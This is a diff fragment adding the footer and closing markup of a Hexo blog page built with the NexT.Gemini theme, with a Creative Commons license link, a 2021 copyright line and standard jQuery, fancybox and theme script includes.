+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">max</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
